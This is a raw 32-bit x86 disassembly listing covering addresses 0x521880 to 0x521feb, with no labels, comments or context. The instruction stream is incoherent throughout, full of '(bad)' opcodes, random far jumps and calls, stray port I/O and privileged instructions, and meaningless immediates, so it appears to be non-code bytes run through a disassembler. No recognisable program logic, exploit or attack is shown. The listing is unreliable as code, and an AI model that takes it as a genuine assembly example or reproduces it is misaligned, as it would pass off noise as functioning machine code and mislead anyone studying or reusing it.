  521880:	jno    0xa95ce72c
  521886:	out    0x2e,al
  521888:	les    eax,FWORD PTR [ebp-0x53]
  52188b:	push   0xa0c26d2b
  521890:	test   al,0x37
  521892:	and    eax,0x9ae77174
  521897:	inc    ebp
  521898:	push   ecx
  521899:	mov    esi,es
  52189b:	jp     0x521891
  52189d:	je     0x5218f0
  52189f:	nop
  5218a0:	lods   eax,DWORD PTR ds:[esi]
  5218a1:	add    al,0x51
  5218a3:	inc    edx
  5218a4:	in     al,dx
  5218a5:	out    0x55,eax
  5218a7:	adc    BYTE PTR [ecx],cl
  5218a9:	cld    
  5218aa:	cmp    al,0x41
  5218ac:	cmp    dh,BYTE PTR [ecx]
  5218ae:	xchg   ecx,eax
  5218af:	das    
  5218b0:	repnz int3 
  5218b2:	cld    
  5218b3:	jecxz  0x521897
  5218b5:	inc    esp
  5218b6:	mov    dh,0x43
  5218b8:	jbe    0x521869
  5218ba:	xchg   DWORD PTR [eax],esi
  5218bc:	mov    edx,0xc1a291cc
  5218c1:	mov    cl,dh
  5218c3:	xor    al,0x3c
  5218c5:	sbb    DWORD PTR [ebx+edx*1],ebp
  5218c8:	push   esp
  5218c9:	fsubr  QWORD PTR [ebx-0x551e81f3]
  5218cf:	pminsw mm6,QWORD PTR [esi]
  5218d2:	popf   
  5218d3:	lea    esi,[ebp+ebp*2-0x30861c64]
  5218da:	ds push edx
  5218dc:	ins    DWORD PTR es:[edi],dx
  5218dd:	ffree  st(3)
  5218df:	fdiv   QWORD PTR fs:[ecx]
  5218e2:	push   ecx
  5218e3:	push   esp
  5218e4:	out    dx,eax
  5218e5:	imul   edi,ebp,0x0
  5218e8:	sbb    BYTE PTR [ebp+0x6aeabac7],ch
  5218ee:	mov    ds,WORD PTR [esi+0x3d]
  5218f1:	jecxz  0x521887
  5218f3:	mov    ebp,0x63f5a08b
  5218f8:	ss and eax,0x53175839
  5218fe:	stos   DWORD PTR es:[edi],eax
  5218ff:	cmp    al,0x32
  521901:	mov    cl,BYTE PTR [ebp-0x51]
  521904:	sti    
  521905:	or     edi,DWORD PTR [eax]
  521907:	stos   DWORD PTR es:[edi],eax
  521908:	repnz retf 
  52190a:	int3   
  52190b:	lea    ebx,[ebp-0x31]
  52190e:	or     BYTE PTR [ebx-0x21b5013],cl
  521914:	mov    ebp,0x2b522d1b
  521919:	shl    BYTE PTR [eax],1
  52191b:	lock fild QWORD PTR [ecx-0x16]
  52191f:	lods   eax,DWORD PTR ds:[esi]
  521920:	retf   0xc1b0
  521923:	cmp    cl,dh
  521925:	loop   0x521919
  521927:	ins    DWORD PTR es:[edi],dx
  521928:	mov    ebx,DWORD PTR [ecx+0x15f54671]
  52192e:	xor    esp,DWORD PTR [ecx+eiz*2]
  521931:	repnz mov bh,0x34
  521934:	lods   al,BYTE PTR ds:[esi]
  521935:	cmp    DWORD PTR [edi],0x28
  521938:	(bad)  
  521939:	sub    DWORD PTR [esi+eiz*8],edi
  52193c:	inc    ebp
  52193d:	push   esi
  52193e:	mov    esi,0x5c68db40
  521943:	jl     0x5219a4
  521945:	pop    esp
  521946:	out    dx,eax
  521947:	xor    esi,DWORD PTR [edi-0x17]
  52194a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52194b:	call   FWORD PTR [edi+0x4ec15d0b]
  521951:	jmp    0x30b61ad5
  521956:	pop    eax
  521957:	imul   edi,DWORD PTR [edx],0x39
  52195a:	pop    ebp
  52195b:	cmp    ebp,DWORD PTR [eax-0x4f]
  52195e:	call   0xe74f6c50
  521963:	int    0x30
  521965:	jnp    0x521980
  521967:	cwde   
  521968:	ss pop eax
  52196a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52196b:	outs   dx,DWORD PTR ds:[esi]
  52196c:	jno    0x521932
  52196e:	xchg   ebp,eax
  52196f:	sub    al,0xf6
  521971:	dec    esi
  521972:	jnp    0x521994
  521974:	and    DWORD PTR [esi],esi
  521976:	or     ebx,ebp
  521978:	ss aas 
  52197a:	es sbb al,0x61
  52197d:	aas    
  52197e:	outs   dx,BYTE PTR ds:[esi]
  52197f:	adc    esi,DWORD PTR [edx+0xee1b195]
  521985:	aam    0x22
  521987:	add    BYTE PTR [edx+0x5],dh
  52198a:	sbb    al,0x44
  52198c:	pop    ebx
  52198d:	mov    bh,0xea
  52198f:	jbe    0x5219d2
  521991:	aaa    
  521992:	jns    0x521974
  521994:	mov    edx,0x9ac910be
  521999:	adc    DWORD PTR [edx+0x75],ebx
  52199c:	in     eax,dx
  52199d:	shl    BYTE PTR [eax],cl
  52199f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5219a0:	mov    ds:0x9e748c09,eax
  5219a5:	ror    DWORD PTR [ebx],cl
  5219a7:	or     al,0xe8
  5219a9:	push   ebp
  5219aa:	repz and edi,eax
  5219ad:	mov    BYTE PTR [ebp-0x754d9b3e],ch
  5219b3:	scas   eax,DWORD PTR es:[edi]
  5219b4:	xchg   DWORD PTR [bx+di-0x7d7b],ecx
  5219b9:	cmp    ah,dh
  5219bb:	xchg   edx,eax
  5219bc:	xor    DWORD PTR [ebp+0x296ada2c],0xffffff92
  5219c3:	std    
  5219c4:	sbb    BYTE PTR [eax+0xffdbdb],ch
  5219ca:	aaa    
  5219cb:	outs   dx,BYTE PTR ds:[esi]
  5219cc:	iret   
  5219cd:	in     al,dx
  5219ce:	xor    DWORD PTR [esi+ebx*4-0xc],eax
  5219d2:	xchg   edi,eax
  5219d3:	jmp    0x2f53:0x7a6e45a4
  5219da:	xor    al,0xdd
  5219dc:	repnz clc 
  5219de:	sar    dl,1
  5219e0:	out    dx,al
  5219e1:	test   al,0x63
  5219e3:	jo     0x521a4e
  5219e5:	ret    0x2f5d
  5219e8:	popf   
  5219e9:	pusha  
  5219ea:	ret    
  5219eb:	mov    edx,0x38f4a7fa
  5219f0:	push   ds
  5219f1:	pop    esp
  5219f2:	out    dx,al
  5219f3:	clc    
  5219f4:	mov    ebp,0x14aefaa8
  5219f9:	jnp    0x5219fc
  5219fb:	jbe    0x5219a3
  5219fd:	cmp    eax,0x87c125fc
  521a02:	xchg   ebx,eax
  521a03:	inc    edx
  521a04:	repz push es
  521a06:	and    eax,0x5a45f19b
  521a0b:	add    BYTE PTR [ecx-0x6b40854d],0xb4
  521a12:	xchg   BYTE PTR [edi-0x9a20434],dh
  521a18:	mov    eax,ds:0x5be09441
  521a1d:	stos   BYTE PTR es:[edi],al
  521a1e:	add    eax,0x154921c8
  521a23:	nop
  521a24:	fs pop ss
  521a26:	pop    ds
  521a27:	pop    ebp
  521a28:	jb     0x5219bf
  521a2a:	cmp    DWORD PTR [edi],edi
  521a2c:	div    BYTE PTR [edx-0x21]
  521a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521a30:	es cwde 
  521a32:	stos   BYTE PTR es:[edi],al
  521a33:	dec    edi
  521a34:	cmove  ebp,DWORD PTR ds:0x77c24d89
  521a3b:	mov    WORD PTR [ebx-0x37],?
  521a3e:	and    DWORD PTR [ebx-0x7f56ffdc],edi
  521a44:	push   0xffffffd7
  521a46:	push   esp
  521a47:	dec    esp
  521a48:	jle    0x521a01
  521a4a:	mov    BYTE PTR [edi+0x1b],bl
  521a4d:	sub    al,0xe0
  521a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521a50:	dec    esi
  521a51:	jno    0x521a81
  521a53:	cmp    al,BYTE PTR [edx+0x76]
  521a56:	test   BYTE PTR [edi+esi*1-0x3adf3d72],dh
  521a5d:	xlat   BYTE PTR ds:[ebx]
  521a5e:	sub    al,0xbf
  521a60:	or     BYTE PTR [ebp-0x7241b36d],cl
  521a66:	jmp    0x577f2075
  521a6b:	xchg   edi,eax
  521a6c:	call   0xe1f94f26
  521a71:	out    0x22,al
  521a73:	mov    dh,0xd8
  521a75:	dec    eax
  521a76:	in     eax,dx
  521a77:	into   
  521a78:	shr    BYTE PTR [edi+0x4b08648d],0xeb
  521a7f:	xchg   edi,eax
  521a80:	dec    esp
  521a81:	jecxz  0x521ac1
  521a83:	iret   
  521a84:	out    dx,al
  521a85:	adc    al,0x63
  521a87:	push   ecx
  521a88:	imul   ecx,DWORD PTR [ecx+0x76b9d710],0x68ae754
  521a92:	(bad)  
  521a93:	in     eax,dx
  521a94:	clc    
  521a95:	hlt    
  521a96:	push   ds
  521a97:	fwait
  521a98:	std    
  521a99:	and    al,al
  521a9b:	or     al,0xa5
  521a9d:	jns    0x521a5b
  521a9f:	ror    BYTE PTR [ebx+edx*2],cl
  521aa2:	xchg   DWORD PTR [eax],ecx
  521aa4:	xor    esp,DWORD PTR [edi]
  521aa6:	cmp    ebp,DWORD PTR [eax+0x2d]
  521aa9:	icebp  
  521aaa:	loope  0x521a75
  521aac:	mov    BYTE PTR [eax-0x13910297],cl
  521ab2:	mov    dh,0x46
  521ab4:	adc    al,0x9f
  521ab6:	shl    DWORD PTR [esp+ebx*8-0x34],1
  521aba:	mov    bh,0x65
  521abc:	fwait
  521abd:	jp     0x521a6a
  521abf:	or     DWORD PTR [ebx],edi
  521ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  521ac2:	popa   
  521ac3:	aad    0xe8
  521ac5:	xor    al,0x8a
  521ac7:	out    0xb1,al
  521ac9:	popa   
  521aca:	bound  edx,QWORD PTR [ebp-0x6d4b725b]
  521ad0:	dec    ecx
  521ad1:	xchg   DWORD PTR [ecx+edx*8-0x298e5805],ebp
  521ad8:	jmp    0xb8ec8929
  521add:	push   cs
  521ade:	pop    ds
  521adf:	pop    esi
  521ae0:	xchg   edx,eax
  521ae1:	scas   eax,DWORD PTR es:[edi]
  521ae2:	outs   dx,DWORD PTR ds:[esi]
  521ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  521ae4:	test   eax,0xc1f7ad70
  521ae9:	inc    edx
  521aea:	fwait
  521aeb:	or     ebx,DWORD PTR [ebx+0x4d1a7b4a]
  521af1:	dec    edx
  521af2:	pop    esi
  521af3:	or     esi,DWORD PTR [eax-0x79d78f25]
  521af9:	sbb    ecx,DWORD PTR [ebp-0x50]
  521afc:	into   
  521afd:	bsf    ecx,DWORD PTR [edi+0x4df70e8d]
  521b04:	lea    edx,[esi+0x4c8a665a]
  521b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  521b0b:	adc    dh,ah
  521b0d:	mov    esi,0xef03a116
  521b12:	enter  0xfb5d,0xb5
  521b16:	mov    ah,0x56
  521b18:	and    ebx,DWORD PTR [eax+ecx*1+0x7e]
  521b1c:	mov    esi,DWORD PTR [ebx+eiz*8+0x78f3875a]
  521b23:	popa   
  521b24:	popf   
  521b25:	mov    esi,0xba227700
  521b2a:	jecxz  0x521ad0
  521b2c:	adc    DWORD PTR [eax+0x1b],0xffffffae
  521b30:	and    dh,dh
  521b32:	stc    
  521b33:	sub    edx,DWORD PTR [ebx-0x5e348bdd]
  521b39:	(bad)  
  521b3a:	cmp    BYTE PTR [edx],dh
  521b3c:	in     eax,dx
  521b3d:	push   cs
  521b3e:	rol    BYTE PTR ds:0x93e13d92,0x21
  521b45:	ins    DWORD PTR es:[edi],dx
  521b46:	clc    
  521b47:	cwde   
  521b48:	push   0x4e
  521b4a:	dec    ebx
  521b4b:	jmp    0xe5236ef
  521b50:	call   0xa991:0x4263019
  521b57:	dec    edx
  521b58:	fild   WORD PTR [ebx+0x5f42153e]
  521b5e:	xchg   ebp,eax
  521b5f:	jmp    0xbec3b3a3
  521b64:	imul   ebp,DWORD PTR [esi],0xf55a1a47
  521b6a:	das    
  521b6b:	push   es
  521b6c:	test   ch,0x5c
  521b6f:	outs   dx,DWORD PTR ds:[esi]
  521b70:	cmp    eax,0x403f186e
  521b75:	sub    BYTE PTR [esi],al
  521b77:	dec    esi
  521b78:	out    0xc,al
  521b7a:	in     eax,dx
  521b7b:	(bad)  
  521b7d:	rcl    BYTE PTR [ebp+ebp*2-0x3b6f26a2],1
  521b84:	xlat   BYTE PTR ds:[ebx]
  521b85:	fndisi(8087 only) 
  521b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  521b88:	fstp   QWORD PTR [ecx-0x20]
  521b8b:	adc    DWORD PTR [ecx+0x7248dcc],0x5004004b
  521b95:	push   ss
  521b96:	lods   eax,DWORD PTR ds:[esi]
  521b97:	jge    0x521b95
  521b99:	xor    ecx,ebp
  521b9b:	pop    eax
  521b9c:	dec    ecx
  521b9d:	scas   al,BYTE PTR es:[edi]
  521b9e:	jp     0x521b48
  521ba0:	adc    BYTE PTR [ebx],al
  521ba2:	leave  
  521ba3:	or     BYTE PTR [ebx-0x56],dl
  521ba6:	dec    ecx
  521ba7:	push   ecx
  521ba8:	inc    ebx
  521ba9:	jmp    0x9646:0xafcfbee5
  521bb0:	push   ecx
  521bb1:	outs   dx,BYTE PTR ds:[esi]
  521bb2:	in     al,0x9f
  521bb4:	xchg   edx,eax
  521bb5:	adc    al,0xb8
  521bb7:	pop    ecx
  521bb8:	popf   
  521bb9:	or     al,0x6c
  521bbb:	xchg   edx,eax
  521bbc:	pop    esp
  521bbd:	push   ds
  521bbe:	jno    0x521b4e
  521bc0:	sar    DWORD PTR es:[ecx+ebp*4+0x45],cl
  521bc5:	and    al,0x52
  521bc7:	psubb  mm5,QWORD PTR [edi+0xd1e3978]
  521bce:	mov    ecx,DWORD PTR [edx-0x5227543d]
  521bd4:	jl     0x521b85
  521bd6:	xchg   ecx,eax
  521bd7:	lods   eax,DWORD PTR ds:[esi]
  521bd8:	rcl    DWORD PTR [eax],cl
  521bda:	scas   eax,DWORD PTR es:[edi]
  521bdb:	push   0xffffffe7
  521bdd:	into   
  521bde:	mov    ebp,0x37075892
  521be3:	sti    
  521be4:	push   0x7a
  521be6:	popf   
  521be7:	push   0x934d0009
  521bec:	mov    ch,0x5d
  521bee:	and    DWORD PTR [ebx+ebx*8],eax
  521bf1:	pusha  
  521bf2:	loopne 0x521baa
  521bf4:	(bad)  
  521bf5:	sub    eax,0xe9e36d33
  521bfa:	add    BYTE PTR [esi],dl
  521bfc:	jmp    0x9fa4e1a8
  521c01:	lods   eax,DWORD PTR ds:[esi]
  521c02:	shr    DWORD PTR [ecx+0x6c05e894],0xe1
  521c09:	repz cmp BYTE PTR [esi-0x5a],bl
  521c0d:	mov    eax,0x4e21718a
  521c12:	xor    cl,BYTE PTR [edi+0x57]
  521c15:	jno    0x521c26
  521c17:	pop    es
  521c18:	cmp    DWORD PTR [eax-0x69],esp
  521c1b:	push   0x44
  521c1d:	cwde   
  521c1e:	mov    WORD PTR [eax+0x3eb05d97],?
  521c24:	inc    edi
  521c25:	sub    eax,0xcd2446bd
  521c2a:	fs cs inc ecx
  521c2d:	popf   
  521c2e:	mov    al,0x5f
  521c30:	pop    ebx
  521c31:	imul   ebp,DWORD PTR [ebx-0x66],0xa51888a
  521c38:	rol    DWORD PTR [esp+ecx*2+0x6c6e700c],cl
  521c3f:	loopne 0x521c23
  521c41:	aaa    
  521c42:	lods   eax,DWORD PTR ds:[esi]
  521c43:	jo     0x521c78
  521c45:	push   edx
  521c46:	div    DWORD PTR [ecx+0x55410fff]
  521c4c:	and    eax,0x7ed46bf7
  521c51:	mov    esp,0xf349cb2
  521c56:	in     eax,0x9c
  521c58:	sub    bl,BYTE PTR fs:[ecx+0x2f]
  521c5c:	loope  0x521c07
  521c5e:	jb     0x521cd6
  521c60:	and    cl,BYTE PTR [ebp-0x10]
  521c63:	scas   al,BYTE PTR es:[edi]
  521c64:	adc    al,0xd2
  521c66:	pop    edx
  521c67:	or     eax,ebx
  521c69:	test   eax,0xe63e56bf
  521c6e:	mov    ds:0x84a8b286,al
  521c73:	mov    es,WORD PTR [ecx+0x42]
  521c76:	repnz mov edi,0x331adc5a
  521c7c:	pop    esi
  521c7d:	mov    ecx,0x28fc3163
  521c82:	cmp    al,0x40
  521c84:	int    0xc8
  521c86:	shl    DWORD PTR [ebp-0x3e],cl
  521c89:	cs add esi,esi
  521c8c:	ins    DWORD PTR es:[edi],dx
  521c8d:	icebp  
  521c8e:	sbb    eax,0xc54446f7
  521c93:	icebp  
  521c94:	cmp    BYTE PTR [ecx],ch
  521c96:	add    cl,0x5b
  521c99:	push   ebp
  521c9a:	push   edx
  521c9b:	adc    eax,DWORD PTR [ecx-0x41c4a4fe]
  521ca1:	xor    DWORD PTR [ebp+eiz*2-0x1d],edx
  521ca5:	dec    edi
  521ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521ca7:	ins    DWORD PTR es:[edi],dx
  521ca8:	push   ss
  521ca9:	int3   
  521caa:	imul   ecx,DWORD PTR [esi-0x1b],0x7d
  521cae:	jge    0x521c6c
  521cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521cb1:	mov    ebx,0x2b88bc20
  521cb6:	inc    edi
  521cb7:	inc    ecx
  521cb8:	inc    ebx
  521cb9:	mov    ch,0xc5
  521cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  521cbc:	shr    BYTE PTR [eax],cl
  521cbe:	jmp    0x521c85
  521cc0:	fld    QWORD PTR [edx+eax*1]
  521cc3:	in     eax,dx
  521cc4:	leave  
  521cc5:	ficomp DWORD PTR [esi]
  521cc7:	jl     0x521cfb
  521cc9:	fsubr  st(7),st
  521ccb:	push   ebp
  521ccc:	push   0x505de17d
  521cd1:	fistp  QWORD PTR [ebx]
  521cd3:	retf   
  521cd4:	adc    al,0x97
  521cd6:	xchg   edx,eax
  521cd7:	es pushf 
  521cd9:	dec    eax
  521cda:	imul   eax,DWORD PTR [eax+edx*2-0x45afc481],0x44
  521ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521ce3:	ins    DWORD PTR es:[edi],dx
  521ce4:	mov    al,0x6f
  521ce6:	add    BYTE PTR ds:0x9b22bb03,dh
  521cec:	repnz xor al,0xfc
  521cef:	cdq    
  521cf0:	hlt    
  521cf1:	iret   
  521cf2:	xchg   ebp,eax
  521cf3:	sbb    cl,BYTE PTR [ecx+0x25d41d51]
  521cf9:	enter  0xd7c7,0xca
  521cfd:	jo     0x521ca8
  521cff:	sub    cl,bl
  521d01:	push   esi
  521d02:	(bad)  
  521d03:	rcr    DWORD PTR [ebx+0x2f3448a5],0xe3
  521d0a:	sub    eax,0xdd4fdf0
  521d0f:	xchg   ebx,eax
  521d10:	das    
  521d11:	mov    ecx,eax
  521d13:	addr16 enter 0x99cd,0xc9
  521d18:	or     ah,bh
  521d1a:	out    0x4b,al
  521d1c:	dec    ebp
  521d1d:	mov    bh,0x3a
  521d1f:	cdq    
  521d20:	or     al,0xe5
  521d22:	push   edx
  521d23:	jecxz  0x521d94
  521d25:	leave  
  521d26:	out    0xd9,eax
  521d28:	ja     0x521cb9
  521d2a:	sub    dl,0xf6
  521d2d:	in     al,0x96
  521d2f:	adc    eax,0x93654230
  521d34:	adc    bl,cl
  521d36:	loopne 0x521cc1
  521d38:	xor    al,0x3e
  521d3a:	scas   eax,DWORD PTR es:[edi]
  521d3b:	pop    ebp
  521d3c:	cmp    bh,bh
  521d3e:	stc    
  521d3f:	ja     0x521d46
  521d41:	cwde   
  521d42:	scas   eax,DWORD PTR es:[edi]
  521d43:	xchg   ebp,eax
  521d44:	loop   0x521d2d
  521d46:	mov    eax,ds:0x32c87f2a
  521d4b:	push   eax
  521d4c:	xchg   ecx,eax
  521d4d:	shr    DWORD PTR [ecx+0x3a],0x60
  521d51:	enter  0x829d,0x6d
  521d55:	lock pop esp
  521d57:	pop    ds
  521d58:	cmp    al,0xff
  521d5a:	pop    ebp
  521d5b:	sub    DWORD PTR [ebp-0x68],edi
  521d5e:	push   esp
  521d5f:	dec    ebp
  521d60:	xchg   esp,eax
  521d61:	fidivr WORD PTR [edx]
  521d63:	inc    edi
  521d64:	jne    0x521db9
  521d66:	pop    esp
  521d67:	sbb    BYTE PTR [esi],ah
  521d69:	or     BYTE PTR ds:0x14744247,bh
  521d6f:	hlt    
  521d70:	sbb    DWORD PTR [eax],esp
  521d72:	mov    cl,0x2d
  521d74:	or     BYTE PTR [edx+0x7e49ab0],cl
  521d7a:	inc    ebp
  521d7b:	xchg   esp,eax
  521d7c:	repnz mov dh,ch
  521d7f:	mov    esi,0xa2c51aa7
  521d84:	sub    ah,BYTE PTR [edi+0x7f]
  521d87:	jno    0x521d09
  521d89:	add    al,ch
  521d8b:	ins    BYTE PTR es:[edi],dx
  521d8c:	add    di,WORD PTR [edx-0x40]
  521d90:	push   ds
  521d91:	aam    0xad
  521d93:	ret    0x6a35
  521d96:	pusha  
  521d97:	adc    eax,0x497dfad7
  521d9c:	out    0x12,eax
  521d9e:	pop    ebp
  521d9f:	xor    DWORD PTR [ebx+0x75],esi
  521da2:	lds    edi,FWORD PTR [ebx]
  521da4:	cmp    ebx,0xffffffc4
  521da7:	loop   0x521df3
  521da9:	ucomiss xmm4,DWORD PTR [ebx-0x73e49efa]
  521db0:	and    eax,0x9f33b11e
  521db5:	pusha  
  521db6:	fimul  DWORD PTR [eax+0x5b]
  521db9:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  521dbb:	add    BYTE PTR [esi],al
  521dbd:	cmp    dl,BYTE PTR [edx-0x66]
  521dc0:	imul   eax,DWORD PTR [ebp+ebx*8+0x7953b497],0x34f9f17c
  521dcb:	cmp    ah,ah
  521dcd:	and    eax,0xce1bd5c7
  521dd2:	mov    eax,ds:0xf023a3f3
  521dd7:	das    
  521dd8:	push   cs
  521dd9:	int    0xd9
  521ddb:	(bad)  
  521ddc:	int3   
  521ddd:	pusha  
  521dde:	jge    0x521dda
  521de0:	and    al,BYTE PTR [ebp-0x7227636b]
  521de6:	dec    ebp
  521de7:	dec    ebp
  521de8:	jle    0x521e5e
  521dea:	in     eax,dx
  521deb:	mov    ds:0x6a3886f1,al
  521df0:	adc    ecx,DWORD PTR [esi]
  521df2:	pop    ebp
  521df3:	jecxz  0x521de8
  521df5:	loope  0x521e09
  521df7:	or     BYTE PTR [edx+0x11af167a],dh
  521dfd:	cmp    dl,BYTE PTR [ecx-0x14]
  521e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  521e01:	pop    esp
  521e02:	fiadd  DWORD PTR [ecx-0x21091567]
  521e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  521e09:	out    dx,al
  521e0a:	(bad)  
  521e0b:	hlt    
  521e0c:	mov    bh,0xc2
  521e0e:	scas   al,BYTE PTR es:[edi]
  521e0f:	mov    ds,WORD PTR [ebx]
  521e11:	or     DWORD PTR [esi+0x27],eax
  521e14:	and    dh,dh
  521e16:	xchg   DWORD PTR [edx+0x7c012222],esi
  521e1c:	hlt    
  521e1d:	mov    dl,0x18
  521e1f:	(bad)  
  521e20:	adc    ch,dh
  521e22:	xchg   esi,eax
  521e23:	cmp    BYTE PTR ds:0x4f6adcbf,ah
  521e29:	fs mov al,0x70
  521e2c:	xor    DWORD PTR [edi+0x4a],edx
  521e2f:	ins    BYTE PTR es:[edi],dx
  521e30:	stc    
  521e31:	ret    0x4a54
  521e34:	mov    edi,DWORD PTR [edx-0x33]
  521e37:	sub    edx,DWORD PTR [ecx-0x447a5110]
  521e3d:	jnp    0x521eb2
  521e3f:	lods   eax,DWORD PTR ds:[esi]
  521e40:	pop    es
  521e41:	in     eax,dx
  521e42:	in     al,0xb3
  521e44:	jle    0x521e0b
  521e46:	jbe    0x521dfc
  521e48:	mov    ds:0x6b6db61a,al
  521e4d:	dec    edx
  521e4e:	xchg   BYTE PTR [edi+0x72],cl
  521e51:	sub    DWORD PTR [esi],edx
  521e53:	or     al,0x3a
  521e55:	inc    eax
  521e56:	mov    edx,0xadeb45b7
  521e5b:	push   ebp
  521e5c:	sbb    eax,0x1feb52fc
  521e61:	test   BYTE PTR [ecx-0x4b603075],cl
  521e67:	xchg   edi,eax
  521e68:	inc    ebp
  521e69:	aam    0xde
  521e6b:	rol    BYTE PTR [ebx+edx*4+0x5293487b],0xa5
  521e73:	mov    edx,0x95dd3273
  521e78:	daa    
  521e79:	dec    edx
  521e7a:	pop    ss
  521e7b:	mov    edx,0xc4e3dd15
  521e80:	jb     0x521e45
  521e82:	test   eax,0xb0951f75
  521e87:	stos   DWORD PTR es:[edi],eax
  521e88:	int    0x10
  521e8a:	les    edi,FWORD PTR [ebx]
  521e8c:	repz pop ss
  521e8e:	cwde   
  521e8f:	leave  
  521e90:	pop    es
  521e91:	arpl   WORD PTR [ebx-0x30],di
  521e94:	jns    0x521e38
  521e96:	push   edi
  521e97:	scas   al,BYTE PTR es:[di]
  521e99:	cmp    al,0x41
  521e9b:	jmp    0x521f0d
  521e9d:	(bad)  
  521e9e:	fst    QWORD PTR [ecx+0x4a]
  521ea1:	mov    ch,0x94
  521ea3:	inc    esp
  521ea4:	xlat   BYTE PTR ds:[ebx]
  521ea5:	hlt    
  521ea6:	inc    ebp
  521ea7:	pop    es
  521ea8:	cmp    eax,0x4eb0b655
  521ead:	and    dh,al
  521eaf:	dec    ecx
  521eb0:	jbe    0x521f0e
  521eb2:	addr16 pop es
  521eb4:	sbb    esi,eax
  521eb6:	xor    BYTE PTR [esp+ebx*4],0x80
  521eba:	cmp    al,0x8a
  521ebc:	sub    DWORD PTR [eax+0x3a],ecx
  521ebf:	lds    edx,FWORD PTR [edx-0x3e3bc76f]
  521ec5:	lds    esi,FWORD PTR ds:0xc6478abd
  521ecb:	mov    eax,ds:0x4e0dcd73
  521ed0:	mov    bl,0xf0
  521ed2:	fistp  QWORD PTR [ecx]
  521ed4:	pop    ecx
  521ed5:	adc    ecx,DWORD PTR [ecx+0x5c]
  521ed8:	fcomip st,st(5)
  521eda:	enter  0x299d,0xcc
  521ede:	push   eax
  521edf:	ds mov ecx,0x5b78bdff
  521ee5:	test   DWORD PTR es:[ebx+0x35937b1],ebx
  521eec:	fwait
  521eed:	ss sbb dl,ch
  521ef0:	mov    edi,0xdc4ae373
  521ef5:	cmovbe edx,DWORD PTR [esi]
  521ef8:	(bad)  
  521efa:	(bad)  
  521efb:	dec    ebx
  521efc:	cmp    ecx,DWORD PTR ds:0xb0d8cd0b
  521f02:	lahf   
  521f03:	mov    cl,0xb3
  521f05:	pop    ebp
  521f06:	mov    ecx,0x643b3442
  521f0b:	ret    
  521f0c:	mov    edx,0xdd8062d6
  521f11:	loope  0x521f53
  521f13:	adc    al,0x28
  521f15:	loope  0x521f61
  521f17:	jmp    0x30418866
  521f1c:	sahf   
  521f1d:	mov    bl,0xbf
  521f1f:	jae    0x521ee8
  521f21:	cmp    ah,dl
  521f23:	mov    esi,0x37633610
  521f28:	(bad)  
  521f29:	jmp    0x67ba:0x75424dcf
  521f30:	(bad)  
  521f31:	pop    edx
  521f32:	sbb    BYTE PTR [eax],ch
  521f34:	jp     0x521f97
  521f36:	mov    WORD PTR [edx],?
  521f38:	dec    DWORD PTR ss:[edi-0x6d]
  521f3c:	push   es
  521f3d:	jbe    0x521f9c
  521f3f:	leave  
  521f40:	rol    DWORD PTR [ecx-0x17],1
  521f43:	inc    ebp
  521f44:	mov    dl,0x6
  521f46:	dec    edi
  521f47:	push   0xffffffc2
  521f49:	mov    ecx,0xdcb9d09
  521f4e:	xor    eax,DWORD PTR [edi]
  521f50:	pop    ecx
  521f51:	jmp    0x52d72907
  521f56:	xor    dl,BYTE PTR [esi]
  521f58:	mov    es:0x28ed61c6,al
  521f5e:	and    al,0xe9
  521f60:	lea    ebp,[edi-0x63]
  521f63:	call   0x9e1f8c6d
  521f68:	lea    esi,[ebx+edi*2]
  521f6b:	test   BYTE PTR [edi+ecx*2+0x48],dh
  521f6f:	add    esi,DWORD PTR [edx-0x3c]
  521f72:	mul    BYTE PTR [ebp+0x74]
  521f75:	into   
  521f76:	in     al,dx
  521f77:	mov    dl,0xa
  521f79:	scas   eax,DWORD PTR es:[edi]
  521f7a:	icebp  
  521f7b:	sub    eax,0x3f6f0b2e
  521f80:	jl     0x521f7d
  521f82:	xchg   ebx,eax
  521f83:	xor    bh,dh
  521f85:	dec    edx
  521f86:	ret    0x4e58
  521f89:	cld    
  521f8a:	cmp    bh,BYTE PTR [esi]
  521f8c:	clc    
  521f8d:	mov    esi,0xcb046744
  521f92:	adc    BYTE PTR [eax],cl
  521f94:	(bad)  
  521f95:	adc    ah,BYTE PTR [ebx+0x7a]
  521f98:	jge    0x521f5a
  521f9a:	icebp  
  521f9b:	cmc    
  521f9c:	lds    edi,FWORD PTR [ebx]
  521f9e:	fisttp QWORD PTR [eax-0x37]
  521fa1:	retf   0x4221
  521fa4:	int    0xb2
  521fa6:	or     dh,BYTE PTR [ebx-0x6bd81d94]
  521fac:	pop    ecx
  521fad:	or     bl,BYTE PTR [ecx+0x16200ac2]
  521fb3:	ins    DWORD PTR es:[edi],dx
  521fb4:	add    DWORD PTR [edx-0xa127f2],eax
  521fba:	(bad)  
  521fbb:	cmp    BYTE PTR fs:[esi],dh
  521fbe:	daa    
  521fbf:	sahf   
  521fc0:	rol    DWORD PTR [ebp-0x592f2474],1
  521fc6:	mov    cl,0xfe
  521fc8:	std    
  521fc9:	pop    esi
  521fca:	nop
  521fcb:	jmp    DWORD PTR [ecx+0x78]
  521fce:	rcr    DWORD PTR [ebp+0x5c],1
  521fd1:	mov    DWORD PTR [ebx-0x21],ebx
  521fd4:	xor    dh,BYTE PTR [edx+ebx*2-0x3a]
  521fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  521fd9:	int3   
  521fda:	es enter 0xa6bc,0x27
  521fdf:	nop
  521fe0:	jne    0x521fdd
  521fe2:	test   eax,0xede0b807
  521fe7:	jo     0x522008
  521fe9:	mov    cl,0xa8
  521feb:	div    DWORD PTR [ecx]
